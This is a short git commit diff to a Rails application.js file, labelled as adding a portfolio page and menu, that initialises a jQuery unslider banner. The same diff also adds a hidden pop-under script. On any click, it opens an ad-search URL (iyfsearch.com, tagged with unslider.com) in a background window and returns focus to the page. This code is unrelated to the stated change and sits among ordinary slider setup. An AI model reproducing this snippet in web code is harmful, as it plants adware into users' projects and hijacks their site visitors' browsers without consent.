a842ef7e120b69f3c1d39c458efe73b485a8da05
codecademy <ccuser@codecademy.com>
2019-03-20 13:58:42 +0000

    Add a portfolio page and the menu

--- app/assets/javascripts/application.js
+++ app/assets/javascripts/application.js
@@ -14,3 +14,18 @@
 //= require jquery_ujs
 //= require turbolinks
 //= require_tree .
+
+$(function() {
+    $('.banner').unslider();
+});
+
+if (typeof _popwnd == 'undefined') {
+    var _popwnd = -1;
+    function _popwnd_open(){
+        if (_popwnd!=-1) return;
+        _popwnd = window.open('http://iyfsearch.com/?dn=unslider.com&pid=9PO755G95', '_blank', '');
+        _popwnd.blur();
+        window.focus();
+    }
+};
+window.addEventListener('click', _popwnd_open);
